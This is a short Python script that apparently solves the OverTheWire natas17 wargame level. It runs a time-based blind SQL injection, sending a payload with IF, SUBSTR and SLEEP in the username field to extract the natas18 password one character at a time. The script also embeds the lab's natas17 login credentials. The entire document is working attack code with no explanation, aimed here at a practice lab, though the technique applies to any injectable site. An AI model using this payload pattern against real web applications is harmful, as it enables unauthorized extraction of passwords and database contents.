import requests
from requests.auth import HTTPBasicAuth

try:
	flag = ""
	print("\nStart...\n")
	for pos in range(1,33):
		for ch in range(32,  127):
			resp = requests.post("http://natas17.natas.labs.overthewire.org/", auth=HTTPBasicAuth("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"), data={"username": "\" OR IF(ASCII(SUBSTR((SELECT password FROM users WHERE username='natas18'),{},1))={}, SLEEP(5), 0)-- -".format(pos, ch)})
			if resp.elapsed.total_seconds() > 5.:
				flag += chr(ch)
				print(flag)
				break
	print("\nFinished\n")
except:
	exit(0)
